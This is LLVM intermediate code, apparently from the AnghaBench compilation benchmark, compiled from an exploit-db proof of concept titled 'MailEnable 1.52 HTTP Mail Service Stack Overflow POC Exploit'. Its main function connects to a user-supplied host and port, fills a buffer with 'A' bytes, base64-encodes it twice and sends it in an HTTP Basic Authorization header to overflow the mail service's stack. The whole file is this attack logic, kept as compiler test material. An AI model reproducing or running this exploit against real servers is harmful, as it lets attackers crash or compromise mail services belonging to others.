; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_9549.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_9549.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@BUFFSZ = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [81 x i8] c"*******************************************************************************\0A\00", align 1
@.str.1 = private unnamed_addr constant [78 x i8] c"MailEnable 1.52 HTTP Mail Service Stack Overflow POC Exploit(encoded comand)\0A\00", align 1
@.str.2 = private unnamed_addr constant [19 x i8] c"\09Credits:fl0 fl0w\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [37 x i8] c"\0AUsage: %s option host option port\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [37 x i8] c"this program is in the directory %s\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [21 x i8] c"- target   %s : %hu\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@BOF1SZ = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [44 x i8] c"GET / HTTP/1.0\0D\0AAuthorization: Basic %s\0D\0A\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"- done\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1000 x i8], align 16
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @BUFFSZ, align 4
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %12, align 8
  %19 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %13, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.1, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  %23 = load i32, i32* %4, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = call i32 @Menuu(i32 %23, i8** %24)
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str, i64 0, i64 0))
  %27 = load i32, i32* %4, align 4
  %28 = load i8**, i8*** %5, align 8
  %29 = call i32 @doit(i32 %27, i8** %28)
  store i32 %29, i32* %15, align 4
  %30 = load i32, i32* @stdout, align 4
  %31 = call i32 @setbuf(i32 %30, i32* null)
  %32 = load i32, i32* @stdout, align 4
  %33 = call i32 @fputs(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32 %32)
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 3
  br i1 %35, label %36, label %42

36:                                               ; preds = %2
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.4, i64 0, i64 0), i8* %39)
  %41 = call i32 @exit(i32 1) #4
  unreachable

42:                                               ; preds = %2
  %43 = load i32, i32* %4, align 4
  %44 = load i8**, i8*** %5, align 8
  %45 = call i32 @args(i32 %43, i8** %44)
  %46 = load i32, i32* %4, align 4
  %47 = icmp sgt i32 %46, 3
  br i1 %47, label %48, label %53

48:                                               ; preds = %42
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 4
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @atoi(i8* %51)
  store i32 %52, i32* %11, align 4
  br label %53

53:                                               ; preds = %48, %42
  %54 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %55 = call i32 @get_executable_path(i8* %54, i32 1000)
  %56 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.5, i64 0, i64 0), i8* %56)
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 2
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 @resolv(i8* %60)
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %63 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %62, i32 0, i32 0
  store i32 %61, i32* %63, align 4
  %64 = load i32, i32* %11, align 4
  %65 = call i32 @htons(i32 %64)
  %66 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %65, i32* %66, align 4
  %67 = load i32, i32* @AF_INET, align 4
  %68 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %67, i32* %68, align 4
  %69 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %70 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %69, i32 0, i32 0
  %71 = load i32, i32* %70, align 4
  %72 = call i8* @inet_ntoa(i32 %71)
  %73 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @ntohs(i32 %74)
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0), i8* %72, i32 %75)
  %77 = load i32, i32* @AF_INET, align 4
  %78 = load i32, i32* @SOCK_STREAM, align 4
  %79 = load i32, i32* @IPPROTO_TCP, align 4
  %80 = call i32 @socket(i32 %77, i32 %78, i32 %79)
  store i32 %80, i32* %8, align 4
  %81 = load i32, i32* %8, align 4
  %82 = icmp slt i32 %81, 0
  br i1 %82, label %83, label %85

83:                                               ; preds = %53
  %84 = call i32 @exit(i32 0) #4
  unreachable

85:                                               ; preds = %53
  %86 = load i32, i32* %8, align 4
  %87 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %88 = call i64 @connect(i32 %86, %struct.sockaddr* %87, i32 12)
  %89 = icmp slt i64 %88, 0
  br i1 %89, label %90, label %92

90:                                               ; preds = %85
  %91 = call i32 @exit(i32 0) #4
  unreachable

92:                                               ; preds = %85
  %93 = load i32, i32* @BOF1SZ, align 4
  store i32 %93, i32* %9, align 4
  %94 = load i32, i32* %9, align 4
  %95 = call i32 @putcc(i8* %19, i8 signext 65, i32 %94)
  %96 = call i8* @base64_encode(i8* %19, i32* %9)
  store i8* %96, i8** %14, align 8
  %97 = load i8*, i8** %14, align 8
  %98 = call i8* @base64_encode(i8* %97, i32* %9)
  store i8* %98, i8** %14, align 8
  %99 = load i8*, i8** %14, align 8
  %100 = call i32 @sprintf(i8* %19, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.7, i64 0, i64 0), i8* %99)
  store i32 %100, i32* %9, align 4
  %101 = load i32, i32* %9, align 4
  %102 = call i32 @fletcher32(i8* %19, i32 %101)
  %103 = load i32, i32* %8, align 4
  %104 = load i32, i32* %9, align 4
  %105 = call i32 @send(i32 %103, i8* %19, i32 %104, i32 0)
  %106 = load i32, i32* %8, align 4
  %107 = call i32 @timeout(i32 %106, i32 5)
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %113, label %109

109:                                              ; preds = %92
  %110 = load i32, i32* %8, align 4
  %111 = load i32, i32* @BUFFSZ, align 4
  %112 = call i32 @recv(i32 %110, i8* %19, i32 %111, i32 0)
  br label %113

113:                                              ; preds = %109, %92
  %114 = load i32, i32* %8, align 4
  %115 = call i32 @close(i32 %114)
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  %117 = load i8*, i8** %12, align 8
  call void @llvm.stackrestore(i8* %117)
  %118 = load i32, i32* %3, align 4
  ret i32 %118
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @Menuu(i32, i8**) #2

declare dso_local i32 @doit(i32, i8**) #2

declare dso_local i32 @setbuf(i32, i32*) #2

declare dso_local i32 @fputs(i8*, i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @args(i32, i8**) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @get_executable_path(i8*, i32) #2

declare dso_local i32 @resolv(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i8* @inet_ntoa(i32) #2

declare dso_local i32 @ntohs(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @putcc(i8*, i8 signext, i32) #2

declare dso_local i8* @base64_encode(i8*, i32*) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i32 @fletcher32(i8*, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @timeout(i32, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
